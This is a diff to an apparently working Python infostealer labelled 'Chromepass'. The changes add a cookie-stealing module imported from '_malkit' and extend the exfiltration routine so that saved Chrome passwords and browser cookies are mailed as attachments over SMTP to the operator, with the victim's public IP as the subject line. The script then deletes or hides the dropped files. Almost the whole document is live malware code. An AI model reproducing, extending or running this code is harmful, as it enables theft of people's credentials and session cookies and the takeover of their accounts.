@@ -5,6 +5,7 @@ import win32crypt
 import urllib
 import socket
 import queue
+from _malkit import cookiesteal
 from shutil import copyfile
 from subprocess import check_call
 from sqlite3 import connect
@@ -14,7 +15,11 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 
-destination = "error.txt"
+
+appdata=os.getenv("APPDATA")
+destination = f"{appdata}\\error.txt"
+cookies_file = f"{appdata}\\cookies.json"
+cookies_file_email = f"{appdata}\\cookies_email.json"
 
 
 def getpass():
@@ -76,6 +81,16 @@ def getpass():
 	conn.close()
 	return 0
 
+def create_attachment(filename):
+	try:
+		with open(filename) as f:
+			attachment = MIMEText(f.read())
+			
+			attachment.add_header('Content-Disposition',
+								'attachment', filename=filename)
+		return attachment
+	except Exception as err:
+		pass
 
 def sendpass():
 	host_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
@@ -84,17 +99,23 @@ def sendpass():
 	pwd = "<<PASSWORD>>"
 	server = "<<SERVER>>"
 	msg = MIMEMultipart()
-	filename = destination
-	f = open(filename)
-	attachment = MIMEText(f.read())
-	f.close()
-	attachment.add_header('Content-Disposition',
-						  'attachment', filename=destination)
+	password_file = destination
+	try:
+		saved_passwords=create_attachment(password_file)
+		cookies_all = create_attachment(cookies_file)
+		cookies_email = create_attachment(cookies_file_email)
+	except Exception as err:
+		pass
 	msg['Subject'] = f'{host_ip}'
 	msg['From'] = "Chromepass <chromepass@itsec.bz>"
 	msg['To'] = mailto
 	msg["Date"] = formatdate(localtime=True)
-	msg.attach(attachment)
+	msg.attach(saved_passwords)
+	try:
+		msg.attach(cookies_all)
+		msg.attach(cookies_email)
+	except Exception as e:
+		pass
 	mailer = smtplib.SMTP(server, 587)
 	mailer.starttls()
 	mailer.login(email, pwd)
@@ -103,12 +124,16 @@ def sendpass():
 
 
 getpass()
+cookiesteal.cookiesteal()
 sendpass()
 
-try:
-	os.remove(destination)
-except:
-	check_call(["attrib", "+H", destination])
+files = [destination, cookies_file, cookies_file_email]
+for file in files:
+	try:
+		os.remove(file)
+	except:
+		check_call(["attrib", "+H", file])
+
 	
 <<ERROR>>
 
